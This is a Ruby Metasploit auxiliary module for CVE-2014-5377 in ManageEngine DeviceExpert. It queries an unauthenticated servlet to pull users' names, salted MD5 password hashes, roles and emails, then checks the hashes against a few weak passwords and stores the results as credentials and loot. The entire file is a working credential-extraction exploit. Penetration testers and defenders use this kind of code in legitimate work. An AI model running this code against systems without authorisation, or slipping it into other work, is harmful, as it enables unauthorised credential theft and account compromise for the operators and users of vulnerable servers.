##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => 'ManageEngine DeviceExpert User Credentials',
      'Description'    => %q{
        This module extracts usernames and salted MD5 password hashes
        from ManageEngine DeviceExpert version 5.9 build 5980 and prior.

        This module has been tested successfully on DeviceExpert
        version 5.9.7 build 5970.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Discovery and exploit
          'bcoles'  # metasploit module
        ],
      'References'     =>
        [
          ['EDB', '34449'],
          ['OSVDB', '110522'],
          ['CVE', '2014-5377']
        ],
      'DisclosureDate' => 'Aug 28 2014'))
    register_options(
      [
        Opt::RPORT(6060),
        OptBool.new('SSL', [true, 'Use SSL', true])
      ])
  end

  def check
    get_users ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  end

  def get_users
    users = nil
    vprint_status("Reading users from master...")
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'ReadUsersFromMasterServlet'))
    if !res
      vprint_error("Connection failed")
    elsif res.code == 404
      vprint_error("Could not find 'ReadUsersFromMasterServlet'")
    elsif res.code == 200 && res.body =~ /<discoverydata>(.+)<\/discoverydata>/
      users = res.body.scan(/<discoverydata>(.*?)<\/discoverydata>/)
      vprint_good("Found #{users.length} users")
    else
      vprint_error("Could not find any users")
    end
    users
  end

  def parse_user_data(user)
    return if user.nil?
    username = user.scan(/<username>([^<]+)</).flatten.first
    encoded_hash = user.scan(/<password>([^<]+)</).flatten.first
    role = user.scan(/<userrole>([^<]+)</).flatten.first
    mail = user.scan(/<emailid>([^<]+)</).flatten.first
    salt = user.scan(/<saltvalue>([^<]+)</).flatten.first
    hash = Rex::Text.decode_base64(encoded_hash).unpack('H*').flatten.first
    pass = nil
    ['12345', 'admin', 'password', username].each do |weak_password|
      if hash == Rex::Text.md5(weak_password + salt)
        pass = weak_password
        break
      end
    end
    [username, pass, hash, role, mail, salt]
  end

  def run_host(ip)
    users = get_users
    return if users.nil?

    service_data = {
      address: rhost,
      port: rport,
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    cred_table = Rex::Text::Table.new(
      'Header'  => 'ManageEngine DeviceExpert User Credentials',
      'Indent'  => 1,
      'Columns' =>
        [
          'Username',
          'Password',
          'Password Hash',
          'Role',
          'E-mail',
          'Password Salt'
        ]
    )

    vprint_status("Parsing user data...")
    users.each do |user|
      record = parse_user_data(user.to_s)
      next if record.join.empty?

      user = record[0]
      pass = record[1]
      hash = record[2]
      role = record[3]
      mail = record[4]
      salt = record[5]

      cred_table << [user, pass, hash, role, mail, salt]

      if pass
        print_good("Found weak credentials (#{user}:#{pass})")
        credential_data = {
          origin_type: :service,
          module_fullname: self.fullname,
          private_type: :password,
          private_data: pass,
          username: user
        }
      else
        credential_data = {
          origin_type: :service,
          module_fullname: self.fullname,
          private_type: :nonreplayable_hash,
          private_data: "#{salt}:#{hash}",
          username: user
        }
      end

      credential_data.merge!(service_data)
      credential_core = create_credential(credential_data)
      login_data = {
        core: credential_core,
        access_level: role,
        status: Metasploit::Model::Login::Status::UNTRIED
      }
      login_data.merge!(service_data)
      create_credential_login(login_data)

    end

    print_line
    print_line("#{cred_table}")
    loot_name     = 'manageengine.deviceexpert.user.creds'
    loot_type     = 'text/csv'
    loot_filename = 'manageengine_deviceexpert_user_creds.csv'
    loot_desc     = 'ManageEngine DeviceExpert User Credentials'
    p = store_loot(
      loot_name,
      loot_type,
      rhost,
      cred_table.to_csv,
      loot_filename,
      loot_desc)
    print_status "Credentials saved in: #{p}"
  end
end
